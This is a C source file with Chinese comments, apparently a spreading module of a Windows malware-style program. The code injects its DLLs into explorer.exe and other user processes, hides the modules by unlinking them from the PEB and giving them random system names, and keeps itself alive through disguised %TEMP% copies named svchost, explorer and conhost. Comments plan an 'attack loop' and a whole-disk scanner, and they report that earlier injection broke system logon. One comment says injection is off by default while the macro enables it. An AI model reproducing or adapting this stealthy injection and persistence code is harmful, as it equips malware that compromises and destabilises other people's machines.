/* deamon/parts/spread.c —— 被 deamon.c 直接 include：guard 宿主部署 / 句柄交接 / 扩散前置 */

/* ================== guard.dll 宿主部署与句柄交接 ==================
   xx.exe 不再自己加载 guard.dll：那样 xx 一旦被结束，guard 会跟着一起死，
   根本没机会复活 xx。改由这里（跑在 xx.exe 内的 svcguard 实例）把 guard.dll
   注入到同会话的宿主进程，并把 **xx 自己的进程句柄** 复制进宿主、登记到共享
   内存句柄表。guard 侧直接用该句柄判活，不再需要 OpenProcess —— xx 的进程
   DACL 把 Everyone 全拒了，OpenProcess 那条路本来就走不通。 */

/* 本实例是不是跑在"我们自己的 xx"里：xx.exe 本体，或 %TEMP% 里改名的接管副本
   （svchost/explorer/conhost）。必须用路径级判据 —— 副本不叫 xx.exe。 */
static BOOL IsRunningInXxExe(void) {
    WCHAR path[MAX_PATH] = L"";
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return FALSE;
    return XXPathLooksLikeOurXx(path);
}

static BOOL IsSameSession(DWORD pid) {
    DWORD mine = 0, sid = 0;
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &mine)) return FALSE;
    if (!ProcessIdToSessionId(pid, &sid)) return FALSE;
    return (mine == sid);
}

static BOOL GuardHostKnown(DWORD pid) {
    for (int i = 0; i < g_guardCount; i++)
        if (g_guardPids[i] == pid) return TRUE;
    return FALSE;
}

static BOOL HostHasOurGuard(DWORD pid) {
    HANDLE h;
    HMODULE mods[1024];
    DWORD needed = 0, count, i;
    BOOL found = FALSE;

    /* 模块已被摘出 PEB、名字也换成了随机系统 dll 名，模块列表判断不可靠 ——
       而且是**双向失准**：`CreateToolhelp32Snapshot(SNAPMODULE)` / `EnumProcessModules`
       读的就是 PEB 那三条链，我们自己摘链之后它们一律返回"找不到"。
       所以唯一可靠的判据是**单例互斥体探针**（这个名字只有我们建得出来）：
       能打开 = 那一份还活着。下面的模块枚举只当"老版本实例没建互斥体"的兜底，
       它返回 false **不能**当成"没有我们的 guard"。 */
    if (XXModulePresent(pid, L"guard", NameTok())) return TRUE;

    h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!h) return FALSE;
    if (EnumProcessModules(h, mods, sizeof(mods), &needed)) {
        count = needed / sizeof(HMODULE);
        for (i = 0; i < count && !found; i++) {
            WCHAR name[MAX_PATH];
            if (GetModuleFileNameExW(h, mods[i], name, MAX_PATH) &&
                _wcsicmp(name, g_szGuardDllPath) == 0)
                found = TRUE;
        }
    }
    CloseHandle(h);
    if (!found) {
        /* 兜底也可能因为"名字被改成随机系统 dll 名"而认不出：那就按守卫进程的存活判活，
           宁可重复部署一份也不要把活着的守卫当成没部署。 */
        HANDLE hp = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (hp) {
            CloseHandle(hp);
            return TRUE;
        }
    }
    return found;
}

static void ClearHandleEntry(DWORD pid) {
    ULONGLONG tag;
    int i;
    if (!g_pSharedView) return;
    tag = (ULONGLONG)XX_TAG(g_pSharedView);
    for (i = 0; i < HDL_TABLE_MAX; i++) {
        if (XX_HDL_PID(g_pSharedView, i) == pid && XX_HDL_TAG(g_pSharedView, i) == tag) {
            XX_HDL_PID(g_pSharedView, i)    = 0;
            XX_HDL_HANDLE(g_pSharedView, i) = 0;
            XX_HDL_TAG(g_pSharedView, i)    = 0;
        }
    }
}

/* 前置声明：Republish 用到后面定义的 PublishGuardHandle */
static void PublishGuardHandle(HANDLE hHost, DWORD pid);

/* 宿主进程消失 / 我们的 guard.dll 被卸掉后要腾出名额，否则再也不会补部署；
   宿主还在则重发一次句柄 —— xx 重启后 tag 与句柄都变了，不重发这个宿主就永远是死条目。 */
static BOOL RepublishGuardHandle(DWORD pid) {
    HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
    if (!hProc) return FALSE;
    PublishGuardHandle(hProc, pid);
    CloseHandle(hProc);
    return TRUE;
}

static void DropGuardHost(int i) {
    ClearHandleEntry(g_guardPids[i]);
    g_guardPids[i] = g_guardPids[g_guardCount - 1];
    g_guardPids[g_guardCount - 1] = 0;
    g_guardCount--;
}

static void ValidateGuardHosts(void) {
    int i;
    for (i = 0; i < g_guardCount; i++) {
        if (HostHasOurGuard(g_guardPids[i])) {
            if (!RepublishGuardHandle(g_guardPids[i])) {
                WriteDeamonLog(L"guard 宿主无法重发句柄，改投其它宿主 PID=%lu\n", g_guardPids[i]);
                DropGuardHost(i);
                i--;
            }
        } else {
            WriteDeamonLog(L"guard 宿主失效，重新部署 PID=%lu\n", g_guardPids[i]);
            DropGuardHost(i);
            i--;
        }
    }
}

/* 把 xx 自己的进程句柄复制进 hHost，并登记到共享内存句柄表（按宿主 PID 取用）。
   权限只有 查询+同步：即使同一宿主里的对手 DLL 拿到了这个句柄值，也只能等待/查询，
   无法 TerminateProcess(xx)。句柄值只在宿主进程内有效，所以也不需要额外加密。 */
static void PublishGuardHandle(HANDLE hHost, DWORD pid) {
    HANDLE hSelf = NULL, hDup = NULL;
    ULONGLONG tag;
    int i, slot = -1;

    if (!g_pSharedView || !hHost) return;

    /* 源句柄：优先用 xx.exe 在收紧 DACL 之前打开、并写进共享内存的那一个
       （svcguard 与 xx 同进程，句柄值有效）；没有才现场开一次。
       伪句柄不能跨进程复制，所以这里不做那种"退化"。 */
    hSelf = (HANDLE)(ULONG_PTR)XX_SELF_HANDLE(g_pSharedView);
    if (hSelf && GetProcessId(hSelf) != GetCurrentProcessId())
        hSelf = NULL;                       /* 陈旧/无效值，别把别的对象复制进宿主 */

    if (hSelf) {
        if (!DuplicateHandle(GetCurrentProcess(), hSelf, hHost, &hDup, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
            WriteDeamonLog(L"自持句柄复制失败 err=%lu，改现场打开\n", GetLastError());
            hDup = NULL;
        }
    }
    if (!hDup) {
        hSelf = OpenProcess(XX_SHARED_HANDLE_ACCESS, FALSE, GetCurrentProcessId());
        if (hSelf) {
            if (!DuplicateHandle(GetCurrentProcess(), hSelf, hHost, &hDup, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
                WriteDeamonLog(L"现场句柄复制失败 err=%lu\n", GetLastError());
                hDup = NULL;
            }
            CloseHandle(hSelf);
        }
    }
    if (!hDup) {
        WriteDeamonLog(L"guard 句柄交接失败 PID=%lu\n", pid);
        return;
    }
    /* 注意：hDup 是"在宿主进程里有效"的句柄值，本进程既不能用也不能关。 */

    tag = (ULONGLONG)XX_TAG(g_pSharedView);
    for (i = 0; i < HDL_TABLE_MAX; i++) {
        if (XX_HDL_PID(g_pSharedView, i) == pid && XX_HDL_TAG(g_pSharedView, i) == tag) {
            slot = i;
            break;
        }
    }
    if (slot < 0) {
        for (i = 0; i < HDL_TABLE_MAX; i++) {
            if (XX_HDL_PID(g_pSharedView, i) == 0 || XX_HDL_TAG(g_pSharedView, i) != tag) {
                slot = i;
                break;
            }
        }
    }
    if (slot < 0) slot = (int)(pid % HDL_TABLE_MAX);   /* 表满：按 PID 顶掉一格 */

    /* 发布顺序有讲究：句柄先写，pid/reserved 最后写。
       guard 侧要求 GetProcessId(handle) == reserved，所以"最后写的 reserved"
       等于给整条记录上了一个校验和 —— 中间态（新句柄 + 旧 reserved，或反过来）
       一定校验不过，会被读取方跳过，而不会把一个坏句柄送进 WaitForSingleObject。 */
    XX_HDL_HANDLE(g_pSharedView, slot)   = (ULONGLONG)(ULONG_PTR)hDup;
    XX_HDL_TAG(g_pSharedView, slot)      = tag;
    XX_HDL_RESERVED(g_pSharedView, slot) = GetCurrentProcessId();   /* 句柄指向的 xx PID */
    XX_HDL_PID(g_pSharedView, slot)      = pid;
    WriteDeamonLog(L"guard 句柄已登记 PID=%lu slot=%d\n", pid, slot);
}

static void EnsureGuardHosts(void) {
    DWORD cand[GUARD_HOST_MAX];
    int nCand = 0, pass, i;

    if (g_guardCount >= GUARD_HOST_MAX) return;
    if (g_szGuardDllPath[0] == L'\0') return;
    if (GetFileAttributesW(g_szGuardDllPath) == INVALID_FILE_ATTRIBUTES) return;

    /* pass 0 优先 explorer.exe（同会话里最稳），pass 1 用其它同会话进程补齐 */
    for (pass = 0; pass < 2 && g_guardCount + nCand < GUARD_HOST_MAX; pass++) {
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32W pe = { sizeof(pe) };
        if (hSnap == INVALID_HANDLE_VALUE) break;
        if (Process32FirstW(hSnap, &pe)) {
            do {
                BOOL bExplorer = (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0);
                BOOL bDup = FALSE;
                int k;

                if (g_guardCount + nCand >= GUARD_HOST_MAX) break;
                if (pass == 0 && !bExplorer) continue;
                if (pass == 1 && bExplorer) continue;
                if (pe.th32ProcessID == GetCurrentProcessId()) continue;
                if (IsProtected(pe.szExeFile)) continue;
            if (!IsSafeInjectTarget(pe.th32ProcessID, pe.szExeFile)) continue;   /* 安全白名单 */
                if (GuardHostKnown(pe.th32ProcessID)) continue;
                for (k = 0; k < nCand; k++)
                    if (cand[k] == pe.th32ProcessID) bDup = TRUE;
                if (bDup) continue;
                if (!IsSameSession(pe.th32ProcessID)) continue;
            if (!IsSafeInjectTarget(pe.th32ProcessID, pe.szExeFile)) continue;   /* 系统进程一律不注 */
                cand[nCand++] = pe.th32ProcessID;
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    for (i = 0; i < nCand; i++) {
        HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                                   PROCESS_VM_READ | PROCESS_QUERY_INFORMATION |
                                   PROCESS_DUP_HANDLE, FALSE, cand[i]);
        BOOL bDupOk = (hProc != NULL);
        BOOL bCanRead = (hProc != NULL);
        if (!hProc)
            hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, cand[i]);
        if (!hProc) continue;
        if (bCanRead) RepairTargetLdrHook(hProc, cand[i]);

        if (InjectDll(hProc, InjectPathOf(2), cand[i])) {
            if (bDupOk) PublishGuardHandle(hProc, cand[i]);
            if (g_guardCount < GUARD_HOST_MAX) g_guardPids[g_guardCount++] = cand[i];
            WriteDeamonLog(L"guard.dll 已部署到宿主 PID=%lu（句柄%ls）\n",
                           cand[i], bDupOk ? L"已登记" : L"未登记");
        }
        CloseHandle(hProc);
    }
}

/* 弹窗线程可能被 TerminateThread 或已自行退出，而模块还留在宿主里。
   模块已经从 PEB 摘除，既看不到也定位不到它的基址，所以"按基址远程调用
   StartWindow"这条路走不通了 —— 改成**直接重新注入一份**：
     - 宿主里还有活着的实例 → 它的 DllMain 单例检查会拒绝加载，代价极小；
     - 原实例的弹窗线程已死 → 互斥体变成 abandoned，新副本接管并重启弹窗线程。
   这个函数只在"心跳停摆"时被调用（已按 RECOVER 间隔节流），并且刻意忽略
   拒绝黑名单：单例拒绝不代表宿主没救。 */
static void ForceReinjectWindowToHosts(void) {
    HANDLE hSnap;
    PROCESSENTRY32W pe = { sizeof(pe) };
    int attempts = 0, done = 0;

    RefreshInjectCopies();

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            HANDLE hProc;

            if (done >= 4 || attempts >= 8) break;
            if (pe.th32ProcessID <= 4) continue;
            if (pe.th32ProcessID == GetCurrentProcessId()) continue;
            if (IsProtected(pe.szExeFile)) continue;
            if (!IsSafeInjectTarget(pe.th32ProcessID, pe.szExeFile)) continue;   /* 安全白名单 */
            if (!IsSameSession(pe.th32ProcessID)) continue;
            if (!IsSafeInjectTarget(pe.th32ProcessID, pe.szExeFile)) continue;   /* 系统进程一律不注 */

            hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                PROCESS_VM_WRITE | PROCESS_VM_READ |
                                PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;
            attempts++;
            RepairTargetLdrHook(hProc, pe.th32ProcessID);
            if (InjectDll(hProc, InjectPathOf(1), pe.th32ProcessID)) {
                done++;
                WriteDeamonLog(L"心跳停摆：已向 PID=%lu %ls 重新注入 window.dll\n",
                               pe.th32ProcessID, pe.szExeFile);
            }
            CloseHandle(hProc);
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

/* ================== 引导注入：第一毫秒把根扎进 explorer ==================
   为什么必须这么快：yy 的 HunterWorker（yy.cpp 里 bIsGoal 分支）每 **50ms**
   按进程名杀一轮 xx.exe，并先挂起全部线程再 TerminateProcess。xx 随时会没，
   所以"等 xx 初始化完再扩散"的写法等于自杀（原来这里有个 Sleep(5000)，实测就是
   "先开 yy 再开 xx → 有 xx 进程但始终没弹窗"的主因）。
   做法：最多等 300ms 让共享内存就绪，然后**立刻**把 svcguard + window 注入
   控制台会话里的 explorer.exe —— 它几乎总在、且是弹窗最理想的宿主；
   只要这一发成功，弹窗就不再依赖 xx.exe 的存活。 */
/* ================== 注入策略（明确写出来，别让"只注 explorer"这种误解存在） ==================
   轻模块（**所有宿主都注，包括 explorer**）：
     svcguard → 复活/扩散；window → 弹窗（多进程冗余就靠它铺得越广越好）；guard → 宿主看护
   重模块（**不注入弹窗宿主**，只给普通进程）：
     atkcore → 40ms 攻击循环；dedery → 全盘扫描
   原因：重模块的线程/IO 最重，一旦把弹窗宿主（explorer 等）拖崩，弹窗就没了；
        轻模块才是冗余的来源，必须铺得越广越好。 */
/* 当前**真正持有弹窗的那个进程**（共享内存持有者表里本会话那一格）。
   为什么还要这个：光按名字挡 explorer 是不够的 —— window.dll 注入到所有宿主，
   任何宿主都可能抢到弹窗互斥体并真的把窗口显示出来。那个进程就是"当前弹窗宿主"，
   同样不能再往里塞 atkcore/dedery 这种重活，否则它一崩弹窗立刻消失。 */
static BOOL __attribute__((unused)) IsPopupOwnerPid(DWORD pid)
{
    DWORD sid = 0;
    int i;
    if (!g_pSharedView || !pid || pid <= 4) return FALSE;
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &sid)) return FALSE;
    for (i = 0; i < OWNER_SLOTS; i++) {
        if (XX_SLOT_SESSION(g_pSharedView, i) != sid) continue;
        if ((DWORD)XX_SLOT_PID(g_pSharedView, i) == pid) return TRUE;
    }
    return FALSE;
}
/* 当前宿主进程的映像叶子名（explorer.exe 之类）。
   注意：GetModuleFileNameW(NULL) 取的是进程主映像，不受我们摘 PEB 模块链影响。 */
static void OwnHostLeaf(WCHAR *out, SIZE_T cch)
{
    WCHAR path[MAX_PATH] = L"";
    const WCHAR *p;
    if (!out || !cch) return;
    out[0] = L'\0';
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return;
    p = wcsrchr(path, L'\\');
    wcsncpy_s(out, cch, p ? p + 1 : path, _TRUNCATE);
}
/* ================== 宿主注入总开关 ==================
   用户实测（log 2026-10-18）：
     · 每注入一个进程，那个进程里 svcguard.dll 就 [CRASH] 一次（0xC0000005）；
     · explorer 反复"已停止工作"；
     · 更严重的是注销后进不了系统，RPC 服务报告异常 —— 因为 LogonUI.exe / taskmgr.exe /
       wetype_server.exe 这些**系统/安全桌面进程**也被注入了。
   在把"注入后宿主为什么崩"彻底查清之前，**默认关闭一切宿主注入**：
     · svcguard / window / atkcore / dedery 都不再往别的进程里塞；
     · 弹窗只在 xx.exe 里显示（它有自己的消息循环，实测 visible=1 正常）；
     · svcguard 只保留心跳监控（复活 xx）+ 清理蜜罐占位。
   要恢复注入实验，把下面这个宏改成 1 再编。 */
#define XX_HOST_INJECTION 1

/* ================== 桌面类宿主名单（用户指定） ==================
   dwm / explorer / notepad / conhost / cmd —— 这几个注 svcguard + window + guard：
     window 铺得越广，弹窗冗余越强；guard 在里面看门；svcguard 负责复活。
   其余进程注 atkcore + svcguard + dedery（攻击 + 复活 + 全盘清道夫）。 */
static BOOL IsDesktopHostLeaf(LPCWSTR leaf)
{
    static const WCHAR *kDesktop[] = {
        L"dwm.exe", L"explorer.exe", L"notepad.exe", L"conhost.exe", L"cmd.exe", NULL
    };
    int i;
    if (!leaf) return FALSE;
    for (i = 0; kDesktop[i]; i++)
        if (_wcsicmp(leaf, kDesktop[i]) == 0) return TRUE;
    return FALSE;
}
static BOOL IsPopupHostProcess(LPCWSTR leaf)
{
    static const WCHAR *kPopupHosts[] = {
        L"explorer.exe",      /* 桌面 shell：我们最主要的弹窗宿主 */
        L"taskhostw.exe",     /* Win7 里叫 taskhost.exe；这里是新名字，命中就按弹窗宿主处理 */
        L"taskhost.exe",
        NULL
    };
    int i;
    if (!leaf) return FALSE;
    for (i = 0; kPopupHosts[i]; i++)
        if (_wcsicmp(leaf, kPopupHosts[i]) == 0) return TRUE;
    return FALSE;
}

/* ================== 安全注入目标判定 ==================
   用户日志里被注入的进程包括 LogonUI.exe / taskmgr.exe / wetype_server.exe /
   audiodg.exe —— 这些是**系统/安全桌面/特权进程**，注进去一出问题就是"注销进不去系统"。
   规则（保守）：
     · `explorer.exe` / `taskhost(w).exe`：允许（我们的弹窗宿主）；
     · 映像路径在 `%WINDIR%`（System32/SysWOW64/…）下的一律**不注**；
     · 其它用户态程序（装在 Program Files、用户目录、%TEMP% 里的）允许。
   这样既能保住多进程冗余，又不会把登录/系统组件卷进来。 */
static BOOL IsSafeInjectTarget(DWORD pid, LPCWSTR leaf)
{
    HANDLE h;
    WCHAR path[MAX_PATH] = L"";
    DWORD cch = MAX_PATH;
    WCHAR windir[MAX_PATH] = L"";

    if (!pid || pid <= 4) return FALSE;
    /* 桌面类宿主（dwm/explorer/notepad/conhost/cmd）即使在 system32 下也放行 */
    if (leaf && (IsDesktopHostLeaf(leaf) ||
                 _wcsicmp(leaf, L"taskhost.exe") == 0 ||
                 _wcsicmp(leaf, L"taskhostw.exe") == 0)) return TRUE;

    h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return FALSE;
    if (!QueryFullProcessImageNameW(h, 0, path, &cch)) { CloseHandle(h); return FALSE; }
    CloseHandle(h);

    /* 我们自己的 %TEMP% 副本（复活器 svchost/explorer/conhost）**绝不能注**：
       它们只是"等本体死掉再拉起"的看门进程，没有宿主环境；一旦被当成 conhost/explorer
       桌面宿主注进 window.dll，桌面上就会多出第二个弹窗（用户实测：两个窗口）。 */
    {
        WCHAR tdir[MAX_PATH] = L"", mine[MAX_PATH];
        static const WCHAR *kOurCopies[] = { L"svchost.exe", L"explorer.exe", L"conhost.exe", NULL };
        int k;
        if (path[0] && GetTempPathW(MAX_PATH, tdir)) {
            for (k = 0; kOurCopies[k]; k++) {
                swprintf_s(mine, MAX_PATH, L"%ls%ls", tdir, kOurCopies[k]);
                if (_wcsicmp(path, mine) == 0) return FALSE;
            }
        }
    }

    if (GetWindowsDirectoryW(windir, MAX_PATH) && windir[0] &&
        _wcsnicmp(path, windir, wcslen(windir)) == 0)
        return FALSE;                     /* Windows 目录下的系统进程：一个都不注 */

    return TRUE;
}
static BOOL BootstrapInject(LPCWSTR exeName) {
#if !XX_HOST_INJECTION
    UNREFERENCED_PARAMETER(exeName);
    return FALSE;
#endif
    HANDLE hSnap;
    PROCESSENTRY32W pe;
    int done = 0;

    if (!exeName || !exeName[0]) return FALSE;
    if (g_szOwnDir[0] == L'\0' && !InitPaths()) return FALSE;
    RefreshInjectCopies();

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return FALSE;
    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            HANDLE hProc;
            BOOL bWow = FALSE;
            if (_wcsicmp(pe.szExeFile, exeName) != 0) continue;
            if (pe.th32ProcessID == GetCurrentProcessId()) continue;
            if (!IsSameSession(pe.th32ProcessID)) continue;
            if (!IsSafeInjectTarget(pe.th32ProcessID, pe.szExeFile)) continue;   /* 系统进程一律不注 */
            hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                                PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;
            if (IsWow64Process(hProc, &bWow) && bWow) { CloseHandle(hProc); continue; }
            RepairTargetLdrHook(hProc, pe.th32ProcessID);
            if (InjectDll(hProc, InjectPathOf(0), pe.th32ProcessID)) {      /* svcguard */
                done++;
                WriteDeamonLog(L"引导注入: svcguard -> %ls PID=%lu\n", exeName, pe.th32ProcessID);
            }
            InjectDll(hProc, InjectPathOf(1), pe.th32ProcessID);            /* window（弹窗宿主） */
            InjectDll(hProc, InjectPathOf(2), pe.th32ProcessID);            /* guard（宿主看护） */
            /* 只看窗口冗余：atkcore/dedery 不注入宿主（会把 CPU 打满） */
            CloseHandle(hProc);
        } while (Process32NextW(hSnap, &pe) && done < 4);
    }
    CloseHandle(hSnap);
    return done > 0;
}

